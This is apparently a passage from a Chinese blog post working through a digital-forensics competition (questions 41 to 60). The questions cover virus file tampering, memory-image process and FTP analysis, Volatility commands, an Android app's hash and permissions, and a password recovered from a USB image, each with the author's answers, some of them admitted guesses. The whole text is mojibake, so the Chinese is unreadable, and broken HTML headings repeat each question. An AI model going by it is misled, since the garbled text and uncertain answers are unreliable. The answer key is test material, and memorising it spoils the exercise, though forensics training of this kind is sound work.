ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’ç•™ä¸‹äº†ASCII ART(ASCIIè‰ºæœ¯, æ–‡å­—å›¾)ï¼Œä»¥ä¸‹å“ªä¸ªä¸æ˜¯ç—…æ¯’ç•™ä¸‹? (3åˆ†)</h3><p>A. HI</p><p>B. HELLO</p><p>C. HOW ARE YOU</p><p>D. GOODBYE</p><h3 id="42-å•é€‰é¢˜-ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’æ‰°ä¹±æ–‡ä»¶ç›®æ ‡æ–‡ä»¶åæ˜¯ç”šä¹ˆ-2åˆ†"><a href="#42-å•é€‰é¢˜-ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’æ‰°ä¹±æ–‡ä»¶ç›®æ ‡æ–‡ä»¶åæ˜¯ç”šä¹ˆ-2åˆ†" class="headerlink" title="42. [å•é€‰é¢˜] ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’æ‰°ä¹±æ–‡ä»¶ç›®æ ‡æ–‡ä»¶åæ˜¯ç”šä¹ˆ? (2åˆ†)"></a>42. [å•é€‰é¢˜] ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’æ‰°ä¹±æ–‡ä»¶ç›®æ ‡æ–‡ä»¶åæ˜¯ç”šä¹ˆ? (2åˆ†)</h3><p>A. C:\Users\<profile>\Documents\target.txt</p><p>B. C:\Users\<profile>\Desktop\target.txt</p><p>C. C:\c.txt</p><p>D. C:\temp.txt</p><h3 id="43-å•é€‰é¢˜-ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’æ‰°ä¹±æ–‡ä»¶æ–¹æ³•æ˜¯ç”šä¹ˆ-3åˆ†"><a href="#43-å•é€‰é¢˜-ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’æ‰°ä¹±æ–‡ä»¶æ–¹æ³•æ˜¯ç”šä¹ˆ-3åˆ†" class="headerlink" title="43. [å•é€‰é¢˜] ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’æ‰°ä¹±æ–‡ä»¶æ–¹æ³•æ˜¯ç”šä¹ˆ? (3åˆ†)"></a>43. [å•é€‰é¢˜] ç‰¹æ™®çš„è®¡ç®—æœºå¯èƒ½ä¸­äº†ç—…æ¯’ï¼Œç—…æ¯’æ‰°ä¹±æ–‡ä»¶æ–¹æ³•æ˜¯ç”šä¹ˆ? (3åˆ†)</h3><p>A. + 3</p><p>B. XOR 5</p><p>C. + 4</p><p>D. â€“ 4</p><h2 id="è®¡ç®—æœºå†…å­˜é•œåƒ"><a href="#è®¡ç®—æœºå†…å­˜é•œåƒ" class="headerlink" title="è®¡ç®—æœºå†…å­˜é•œåƒ"></a>è®¡ç®—æœºå†…å­˜é•œåƒ</h2><h3 id="44-å¡«ç©ºé¢˜-ç‰¹æ™®çš„è®¡ç®—æœºä¸­ï¼Œå“ªä¸€ä¸ªæ˜¯-FTK-Imager-exe-çš„ç¨‹å¼ç¼–å·-PID-è¯·é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†"><a href="#44-å¡«ç©ºé¢˜-ç‰¹æ™®çš„è®¡ç®—æœºä¸­ï¼Œå“ªä¸€ä¸ªæ˜¯-FTK-Imager-exe-çš„ç¨‹å¼ç¼–å·-PID-è¯·é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†" class="headerlink" title="44. [å¡«ç©ºé¢˜] ç‰¹æ™®çš„è®¡ç®—æœºä¸­ï¼Œå“ªä¸€ä¸ªæ˜¯ FTK Imager.exe çš„ç¨‹å¼ç¼–å·(PID)? (è¯·é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)"></a>44. [å¡«ç©ºé¢˜] ç‰¹æ™®çš„è®¡ç®—æœºä¸­ï¼Œå“ªä¸€ä¸ªæ˜¯ FTK Imager.exe çš„ç¨‹å¼ç¼–å·(PID)? (è¯·é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-222302392.png" class="">  <h3 id="45-å¤šé€‰é¢˜-ç‰¹æ™®çš„è®¡ç®—æœºä¸­ï¼Œcmd-exe-PID-4496-å®ƒçš„æ‰§è¡Œæ—¥æœŸåŠæ—¶é—´æ˜¯-1åˆ†"><a href="#45-å¤šé€‰é¢˜-ç‰¹æ™®çš„è®¡ç®—æœºä¸­ï¼Œcmd-exe-PID-4496-å®ƒçš„æ‰§è¡Œæ—¥æœŸåŠæ—¶é—´æ˜¯-1åˆ†" class="headerlink" title="45. [å¤šé€‰é¢˜] ç‰¹æ™®çš„è®¡ç®—æœºä¸­ï¼Œcmd.exe (PID: 4496) å®ƒçš„æ‰§è¡Œæ—¥æœŸåŠæ—¶é—´æ˜¯? (1åˆ†)"></a>45. [å¤šé€‰é¢˜] ç‰¹æ™®çš„è®¡ç®—æœºä¸­ï¼Œcmd.exe (PID: 4496) å®ƒçš„æ‰§è¡Œæ—¥æœŸåŠæ—¶é—´æ˜¯? (1åˆ†)</h3><p>A. 2021-10-17</p><p>B. 2021-10-18</p><p>C. 2021-10-19</p><p>D. 10:42:51</p><p>E. 10:43:09</p><p>F. 10:43:25<br>CE<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-222346797.png" class="">  </p><h3 id="46-å¡«ç©ºé¢˜-ç‰¹æ™®çš„è®¡ç®—æœºæ›¾ç»ä»¥FTP-å¯¹å¤–è¿æ¥ï¼Œè¿æ¥çš„IPæ˜¯-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€-2åˆ†"><a href="#46-å¡«ç©ºé¢˜-ç‰¹æ™®çš„è®¡ç®—æœºæ›¾ç»ä»¥FTP-å¯¹å¤–è¿æ¥ï¼Œè¿æ¥çš„IPæ˜¯-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€-â€-2åˆ†" class="headerlink" title="46. [å¡«ç©ºé¢˜] ç‰¹æ™®çš„è®¡ç®—æœºæ›¾ç»ä»¥FTP å¯¹å¤–è¿æ¥ï¼Œè¿æ¥çš„IPæ˜¯? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€.â€) (2åˆ†)"></a>46. [å¡«ç©ºé¢˜] ç‰¹æ™®çš„è®¡ç®—æœºæ›¾ç»ä»¥FTP å¯¹å¤–è¿æ¥ï¼Œè¿æ¥çš„IPæ˜¯? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”ï¼Œä¸ç”¨è¾“å…¥â€.â€) (2åˆ†)</h3><h3 id="47-å¤šé€‰é¢˜-ç‰¹æ™®çš„è®¡ç®—æœºä¸­ï¼Œä»¥ä¸‹å“ªä¸€ä¸ªæŒ‡ä»¤äºä¸Šè¿°è¿æ¥ä¸­æœ‰ä½¿ç”¨è¿‡-3åˆ†"><a href="#47-å¤šé€‰é¢˜-ç‰¹æ™®çš„è®¡ç®—æœºä¸­ï¼Œä»¥ä¸‹å“ªä¸€ä¸ªæŒ‡ä»¤äºä¸Šè¿°è¿æ¥ä¸­æœ‰ä½¿ç”¨è¿‡-3åˆ†" class="headerlink" title="47. [å¤šé€‰é¢˜] ç‰¹æ™®çš„è®¡ç®—æœºä¸­ï¼Œä»¥ä¸‹å“ªä¸€ä¸ªæŒ‡ä»¤äºä¸Šè¿°è¿æ¥ä¸­æœ‰ä½¿ç”¨è¿‡? (3åˆ†)"></a>47. [å¤šé€‰é¢˜] ç‰¹æ™®çš„è®¡ç®—æœºä¸­ï¼Œä»¥ä¸‹å“ªä¸€ä¸ªæŒ‡ä»¤äºä¸Šè¿°è¿æ¥ä¸­æœ‰ä½¿ç”¨è¿‡? (3åˆ†)</h3><p>A. get</p><p>B. put</p><p>C. delete</p><p>D. bye</p><p>E. quit<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-223709816.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-223720921.png" class=""><br>çŒœæµ‹å…¶åº”è¯¥æ˜¯å°†ç—…æ¯’æ¨é€åˆ°æœåŠ¡å™¨ï¼Œå³é€‰BD</p><h3 id="48-å¤šé€‰é¢˜-åœ¨Linux-çš„â€Volatilityâ€-ä¸­ï¼Œå“ªä¸€ä¸ªæŒ‡ä»¤å¯ä»¥çŸ¥é“æ­¤ç¨‹å¼æ”¯æŒå“ªä¸€ä¸ªWindows-ç‰ˆæœ¬-2åˆ†"><a href="#48-å¤šé€‰é¢˜-åœ¨Linux-çš„â€Volatilityâ€-ä¸­ï¼Œå“ªä¸€ä¸ªæŒ‡ä»¤å¯ä»¥çŸ¥é“æ­¤ç¨‹å¼æ”¯æŒå“ªä¸€ä¸ªWindows-ç‰ˆæœ¬-2åˆ†" class="headerlink" title="48. [å¤šé€‰é¢˜] åœ¨Linux çš„â€Volatilityâ€ ä¸­ï¼Œå“ªä¸€ä¸ªæŒ‡ä»¤å¯ä»¥çŸ¥é“æ­¤ç¨‹å¼æ”¯æŒå“ªä¸€ä¸ªWindows ç‰ˆæœ¬? (2åˆ†)"></a>48. [å¤šé€‰é¢˜] åœ¨Linux çš„â€Volatilityâ€ ä¸­ï¼Œå“ªä¸€ä¸ªæŒ‡ä»¤å¯ä»¥çŸ¥é“æ­¤ç¨‹å¼æ”¯æŒå“ªä¸€ä¸ªWindows ç‰ˆæœ¬? (2åˆ†)</h3><p>A. vol.py â€”profile</p><p>B. vol.py â€”systeminfo</p><p>C. vol.py â€”info</p><p>D. vol.py â€”verinfo</p><p>é€‰c<br><a href="https://blog.csdn.net/Fly_hps/article/details/79961707">https://blog.csdn.net/Fly_hps/article/details/79961707</a></p><h1 id="å¸¸å¨"><a href="#å¸¸å¨" class="headerlink" title="å¸¸å¨"></a>å¸¸å¨</h1><h2 id="æ‰‹æœº-1"><a href="#æ‰‹æœº-1" class="headerlink" title="æ‰‹æœº"></a>æ‰‹æœº</h2><h3 id="49-å¡«ç©ºé¢˜-å¸¸å¨æ‰‹æœºä¸­çš„Telegramæœ‰å¯èƒ½æ˜¯åœ¨2021å¹´9æœˆ24æ—¥-æ—¶44åˆ†58ç§’-UTC-8-é¦–æ¬¡ä¸‹è½½çš„ã€‚-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—è¾“å…¥ç­”æ¡ˆ-2åˆ†"><a href="#49-å¡«ç©ºé¢˜-å¸¸å¨æ‰‹æœºä¸­çš„Telegramæœ‰å¯èƒ½æ˜¯åœ¨2021å¹´9æœˆ24æ—¥-æ—¶44åˆ†58ç§’-UTC-8-é¦–æ¬¡ä¸‹è½½çš„ã€‚-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—è¾“å…¥ç­”æ¡ˆ-2åˆ†" class="headerlink" title="49. [å¡«ç©ºé¢˜] å¸¸å¨æ‰‹æœºä¸­çš„Telegramæœ‰å¯èƒ½æ˜¯åœ¨2021å¹´9æœˆ24æ—¥_æ—¶44åˆ†58ç§’ (UTC +8) é¦–æ¬¡ä¸‹è½½çš„ã€‚(è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—è¾“å…¥ç­”æ¡ˆ) (2åˆ†)"></a>49. [å¡«ç©ºé¢˜] å¸¸å¨æ‰‹æœºä¸­çš„Telegramæœ‰å¯èƒ½æ˜¯åœ¨2021å¹´9æœˆ24æ—¥<strong>_</strong>æ—¶44åˆ†58ç§’ (UTC +8) é¦–æ¬¡ä¸‹è½½çš„ã€‚(è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—è¾“å…¥ç­”æ¡ˆ) (2åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-224517521.png" class="">  <p>4</p><h3 id="50-å¡«ç©ºé¢˜-å¸¸å¨æ‰‹æœºæ›¾ç»è¿æ¥çš„æ— äººæœºåç§°æ˜¯ä»€ä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†"><a href="#50-å¡«ç©ºé¢˜-å¸¸å¨æ‰‹æœºæ›¾ç»è¿æ¥çš„æ— äººæœºåç§°æ˜¯ä»€ä¹ˆ-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†" class="headerlink" title="50. [å¡«ç©ºé¢˜] å¸¸å¨æ‰‹æœºæ›¾ç»è¿æ¥çš„æ— äººæœºåç§°æ˜¯ä»€ä¹ˆ?(è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)"></a>50. [å¡«ç©ºé¢˜] å¸¸å¨æ‰‹æœºæ›¾ç»è¿æ¥çš„æ— äººæœºåç§°æ˜¯ä»€ä¹ˆ?(è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-224819246.png" class="">  <img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-225224376.png" class="">  <p>SSPARK</p><h3 id="51-å¡«ç©ºé¢˜-å¸¸å¨æ‰‹æœºä¸­ï¼Œæ¡£æ¡ˆâ€œdji1633936161416-mp4â€çš„è§£åƒåº¦æ˜¯-ä¾‹å¦‚æ˜¯1920-x-1280ï¼Œè¯·è¾“å…¥-19201280-ã€‚-1åˆ†"><a href="#51-å¡«ç©ºé¢˜-å¸¸å¨æ‰‹æœºä¸­ï¼Œæ¡£æ¡ˆâ€œdji1633936161416-mp4â€çš„è§£åƒåº¦æ˜¯-ä¾‹å¦‚æ˜¯1920-x-1280ï¼Œè¯·è¾“å…¥-19201280-ã€‚-1åˆ†" class="headerlink" title="51. [å¡«ç©ºé¢˜] å¸¸å¨æ‰‹æœºä¸­ï¼Œæ¡£æ¡ˆâ€œdji1633936161416.mp4â€çš„è§£åƒåº¦æ˜¯ __ (ä¾‹å¦‚æ˜¯1920 x 1280ï¼Œè¯·è¾“å…¥ 19201280)ã€‚ (1åˆ†)"></a>51. [å¡«ç©ºé¢˜] å¸¸å¨æ‰‹æœºä¸­ï¼Œæ¡£æ¡ˆâ€œdji1633936161416.mp4â€çš„è§£åƒåº¦æ˜¯ <strong><strong><strong><em>__</em></strong></strong></strong> (ä¾‹å¦‚æ˜¯1920 x 1280ï¼Œè¯·è¾“å…¥ 19201280)ã€‚ (1åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-225601492.png" class="">  <p>å¯¼å‡ºæ–‡ä»¶æŸ¥çœ‹å±æ€§<br>1280x720</p><h3 id="52-å¡«ç©ºé¢˜-å¸¸å¨æ‰‹æœºä¸­ï¼Œå‘ç°äºç½‘ç»œä¸Šä¸‹è½½çš„è½¯ä»¶â€œå®‰å¿ƒå‡ºè¡Œâ€å®‰è£…æ¡£çš„å“ˆå¸Œå€¼-MD5-æ˜¯-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2åˆ†"><a href="#52-å¡«ç©ºé¢˜-å¸¸å¨æ‰‹æœºä¸­ï¼Œå‘ç°äºç½‘ç»œä¸Šä¸‹è½½çš„è½¯ä»¶â€œå®‰å¿ƒå‡ºè¡Œâ€å®‰è£…æ¡£çš„å“ˆå¸Œå€¼-MD5-æ˜¯-è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2åˆ†" class="headerlink" title="52. [å¡«ç©ºé¢˜] å¸¸å¨æ‰‹æœºä¸­ï¼Œå‘ç°äºç½‘ç»œä¸Šä¸‹è½½çš„è½¯ä»¶â€œå®‰å¿ƒå‡ºè¡Œâ€å®‰è£…æ¡£çš„å“ˆå¸Œå€¼(MD5)æ˜¯?(è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (2åˆ†)"></a>52. [å¡«ç©ºé¢˜] å¸¸å¨æ‰‹æœºä¸­ï¼Œå‘ç°äºç½‘ç»œä¸Šä¸‹è½½çš„è½¯ä»¶â€œå®‰å¿ƒå‡ºè¡Œâ€å®‰è£…æ¡£çš„å“ˆå¸Œå€¼(MD5)æ˜¯?(è¯·ä»¥è‹±æ–‡å…¨å¤§å†™åŠé˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (2åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241105-225855031.png" class="">  <p>81c342665d9a8d4d02b0fbb7033167b5<br>å¯¼å‡ºè®¡ç®—hashå€¼</p><h3 id="53-å¤šé€‰é¢˜-å¸¸å¨æ‰‹æœºä¸­æ‰§è¡Œè½¯ä»¶â€œå®‰å¿ƒå‡ºè¡Œâ€-ç‰ˆæœ¬2-1-3-ä¸­æ¶‰åŠä»¥ä¸‹å®‰å…¨è®¸å¯-2åˆ†"><a href="#53-å¤šé€‰é¢˜-å¸¸å¨æ‰‹æœºä¸­æ‰§è¡Œè½¯ä»¶â€œå®‰å¿ƒå‡ºè¡Œâ€-ç‰ˆæœ¬2-1-3-ä¸­æ¶‰åŠä»¥ä¸‹å®‰å…¨è®¸å¯-2åˆ†" class="headerlink" title="53. [å¤šé€‰é¢˜] å¸¸å¨æ‰‹æœºä¸­æ‰§è¡Œè½¯ä»¶â€œå®‰å¿ƒå‡ºè¡Œâ€(ç‰ˆæœ¬2.1.3)ä¸­æ¶‰åŠä»¥ä¸‹å®‰å…¨è®¸å¯? (2åˆ†)"></a>53. [å¤šé€‰é¢˜] å¸¸å¨æ‰‹æœºä¸­æ‰§è¡Œè½¯ä»¶â€œå®‰å¿ƒå‡ºè¡Œâ€(ç‰ˆæœ¬2.1.3)ä¸­æ¶‰åŠä»¥ä¸‹å®‰å…¨è®¸å¯? (2åˆ†)</h3><p>A. android.permission.ACCESS_WIFI_STATE è·å–WiFiçŠ¶æ€</p><p>B. android.permission.BATTERY_STATSç”µé‡ç»Ÿè®¡</p><p>C. android.permission.VIBRATEä½¿ç”¨æŒ¯åŠ¨</p><p>D. android.permission.CONTROL_LOCATION_UPDATESæ§åˆ¶å®šä½æ›´æ–°</p><p>E. ndroid.permission.CAMERAæ‹ç…§æƒé™</p><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-130827937.png" class="">  <p>A</p><h3 id="54-å¤šé€‰é¢˜-å¸¸å¨æ‰‹æœºä¸­è½¯ä»¶â€œå®‰å¿ƒå‡ºè¡Œâ€-ç‰ˆæœ¬2-1-3-çš„å®‰è£…æ¡£-apk-ä¸­ï¼Œå“ªä¸ªä¸æ˜¯å®ƒçš„ç­¾åç®—æ³•-3åˆ†"><a href="#54-å¤šé€‰é¢˜-å¸¸å¨æ‰‹æœºä¸­è½¯ä»¶â€œå®‰å¿ƒå‡ºè¡Œâ€-ç‰ˆæœ¬2-1-3-çš„å®‰è£…æ¡£-apk-ä¸­ï¼Œå“ªä¸ªä¸æ˜¯å®ƒçš„ç­¾åç®—æ³•-3åˆ†" class="headerlink" title="54. [å¤šé€‰é¢˜] å¸¸å¨æ‰‹æœºä¸­è½¯ä»¶â€œå®‰å¿ƒå‡ºè¡Œâ€(ç‰ˆæœ¬2.1.3)çš„å®‰è£…æ¡£(.apk)ä¸­ï¼Œå“ªä¸ªä¸æ˜¯å®ƒçš„ç­¾åç®—æ³•? (3åˆ†)"></a>54. [å¤šé€‰é¢˜] å¸¸å¨æ‰‹æœºä¸­è½¯ä»¶â€œå®‰å¿ƒå‡ºè¡Œâ€(ç‰ˆæœ¬2.1.3)çš„å®‰è£…æ¡£(.apk)ä¸­ï¼Œå“ªä¸ªä¸æ˜¯å®ƒçš„ç­¾åç®—æ³•? (3åˆ†)</h3><p>A. MD5withRSA</p><p>B. SHA256withRSA</p><p>C. SHA256withDSA</p><p>D. MD5withDSA<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-131912700.png" class=""><br>éƒ½æ˜¯sha256-rsa</p><p>ACD</p><h3 id="55-å¤šé€‰é¢˜-äºå¸¸å¨çš„æ‰‹æœºä¸­æ‰§è¡Œè½¯ä»¶â€œå®‰å¿ƒå‡ºè¡Œâ€-ç‰ˆæœ¬1-å¯èƒ½ä¼šè¿æ¥è‡³å“ªä¸€ä¸ªç½‘ç«™-2åˆ†"><a href="#55-å¤šé€‰é¢˜-äºå¸¸å¨çš„æ‰‹æœºä¸­æ‰§è¡Œè½¯ä»¶â€œå®‰å¿ƒå‡ºè¡Œâ€-ç‰ˆæœ¬1-å¯èƒ½ä¼šè¿æ¥è‡³å“ªä¸€ä¸ªç½‘ç«™-2åˆ†" class="headerlink" title="55. [å¤šé€‰é¢˜] äºå¸¸å¨çš„æ‰‹æœºä¸­æ‰§è¡Œè½¯ä»¶â€œå®‰å¿ƒå‡ºè¡Œâ€(ç‰ˆæœ¬1)å¯èƒ½ä¼šè¿æ¥è‡³å“ªä¸€ä¸ªç½‘ç«™? (2åˆ†)"></a>55. [å¤šé€‰é¢˜] äºå¸¸å¨çš„æ‰‹æœºä¸­æ‰§è¡Œè½¯ä»¶â€œå®‰å¿ƒå‡ºè¡Œâ€(ç‰ˆæœ¬1)å¯èƒ½ä¼šè¿æ¥è‡³å“ªä¸€ä¸ªç½‘ç«™? (2åˆ†)</h3><p>A. <a href="https://back-home-****.pages.dev">https://back-home-****.pages.dev</a></p><p>B. org.chromium.<strong>**</strong>.a5b80edf82b436506</p><p>C. org.chromium.<strong>**</strong>.a5b80edf82b436506_v2</p><p>D. <a href="https://back-home-****.pages.dev/manifest.json">https://back-home-****.pages.dev/manifest.json</a></p><h2 id="USB"><a href="#USB" class="headerlink" title="USB"></a>USB</h2><h3 id="56-å•é€‰é¢˜-åœ¨å¸¸å¨è‹¹æœæ‰‹æè®¡ç®—æœº-ç”¨æˆ·å¼€æœºå¯†ç æ˜¯ä»€ä¹ˆ-æç¤ºï¼šå¸¸å¨-USB-è®¾å¤‡ä¸­å¯èƒ½æœ‰ç›¸å…³æ•°æ®-3åˆ†"><a href="#56-å•é€‰é¢˜-åœ¨å¸¸å¨è‹¹æœæ‰‹æè®¡ç®—æœº-ç”¨æˆ·å¼€æœºå¯†ç æ˜¯ä»€ä¹ˆ-æç¤ºï¼šå¸¸å¨-USB-è®¾å¤‡ä¸­å¯èƒ½æœ‰ç›¸å…³æ•°æ®-3åˆ†" class="headerlink" title="56. [å•é€‰é¢˜] åœ¨å¸¸å¨è‹¹æœæ‰‹æè®¡ç®—æœº, ç”¨æˆ·å¼€æœºå¯†ç æ˜¯ä»€ä¹ˆ ?(æç¤ºï¼šå¸¸å¨ USB è®¾å¤‡ä¸­å¯èƒ½æœ‰ç›¸å…³æ•°æ®) (3åˆ†)"></a>56. [å•é€‰é¢˜] åœ¨å¸¸å¨è‹¹æœæ‰‹æè®¡ç®—æœº, ç”¨æˆ·å¼€æœºå¯†ç æ˜¯ä»€ä¹ˆ ?(æç¤ºï¼šå¸¸å¨ USB è®¾å¤‡ä¸­å¯èƒ½æœ‰ç›¸å…³æ•°æ®) (3åˆ†)</h3><p>A. C<em>*sthegoa</em></p><p>B. Draw<em>*fgd</em>f</p><p>C. Co<em>kkfid</em>dd</p><p>D. App<em>is</em>won<br>é¦–å…ˆå…ˆæ¢å¤USBçš„æ–‡ä»¶å†…å®¹ã€‚<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-171122747.png" class=""><br>å¦‚ä½•åˆ†æå‹¾é€‰çš„å¤åˆæ–‡ä»¶<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-171149429.png" class=""><br>ä¹‹åå†åŸå§‹æœç´¢é‡Œæœç­”æ¡ˆçš„å…³é”®è¯<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-171235868.png" class=""><br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-171302968.png" class=""><br>cpisthegoat</p><h3 id="57-å¡«ç©ºé¢˜-åœ¨å¸¸å¨U-ç›˜å†…æœ‰å¤šå°‘ç£ç›˜åˆ†éš”åŒº-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2åˆ†"><a href="#57-å¡«ç©ºé¢˜-åœ¨å¸¸å¨U-ç›˜å†…æœ‰å¤šå°‘ç£ç›˜åˆ†éš”åŒº-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-2åˆ†" class="headerlink" title="57. [å¡«ç©ºé¢˜] åœ¨å¸¸å¨U ç›˜å†…æœ‰å¤šå°‘ç£ç›˜åˆ†éš”åŒº ? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (2åˆ†)"></a>57. [å¡«ç©ºé¢˜] åœ¨å¸¸å¨U ç›˜å†…æœ‰å¤šå°‘ç£ç›˜åˆ†éš”åŒº ? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (2åˆ†)</h3><p>å°†é•œåƒæ”¾åˆ°x-waysé‡Œ<br><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-171536898.png" class=""><br>4</p><h3 id="58-å¡«ç©ºé¢˜-åœ¨å¸¸å¨U-ç›˜å†…æœ‰å¤šå°‘ä»½excel-æ–‡ä»¶-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†"><a href="#58-å¡«ç©ºé¢˜-åœ¨å¸¸å¨U-ç›˜å†…æœ‰å¤šå°‘ä»½excel-æ–‡ä»¶-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†" class="headerlink" title="58. [å¡«ç©ºé¢˜] åœ¨å¸¸å¨U ç›˜å†…æœ‰å¤šå°‘ä»½excel æ–‡ä»¶ ? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)"></a>58. [å¡«ç©ºé¢˜] åœ¨å¸¸å¨U ç›˜å†…æœ‰å¤šå°‘ä»½excel æ–‡ä»¶ ? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-170214430.png" class="">  <p>3ä»½</p><h3 id="59-å¡«ç©ºé¢˜-åœ¨å¸¸å¨U-ç›˜å†…-å†…å«æœ‰å¤šå°‘ä¸ªå®¢æˆ·æ•°æ®-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†"><a href="#59-å¡«ç©ºé¢˜-åœ¨å¸¸å¨U-ç›˜å†…-å†…å«æœ‰å¤šå°‘ä¸ªå®¢æˆ·æ•°æ®-è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”-1åˆ†" class="headerlink" title="59. [å¡«ç©ºé¢˜] åœ¨å¸¸å¨U ç›˜å†…, å†…å«æœ‰å¤šå°‘ä¸ªå®¢æˆ·æ•°æ® ? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)"></a>59. [å¡«ç©ºé¢˜] åœ¨å¸¸å¨U ç›˜å†…, å†…å«æœ‰å¤šå°‘ä¸ªå®¢æˆ·æ•°æ® ? (è¯·ä»¥é˜¿æ‹‰ä¼¯æ•°å­—å›ç­”) (1åˆ†)</h3><img src="/2024/11/05/%E7%BE%8E%E4%BA%9A21%E5%9B%A2%E4%BD%93/IMG_20241106-171808362.png" class="">  <p>50</p><h3 id="60-å¤šé€‰é¢˜-ä»¥ä¸‹å“ªä¸ªå®¢æˆ·æ•°æ®å‚¨å­˜åœ¨å¸¸å¨Uç›˜å†…-ï¼Ÿ-3åˆ†"><a href="#60-å¤šé€‰é¢˜-ä»¥ä¸‹å“ªä¸ªå®¢æˆ·æ•°æ®å‚¨å­˜åœ¨å¸¸å¨Uç›˜å†…-ï¼Ÿ-3åˆ†" class="headerlink" title="60. [å¤šé€‰é¢˜] ä»¥ä¸‹å“ªä¸ªå®¢æˆ·æ•°æ®å‚¨å­˜åœ¨å¸¸å¨Uç›˜å†… ï¼Ÿ (3åˆ†)"></a>60. [å¤šé€‰é¢˜] 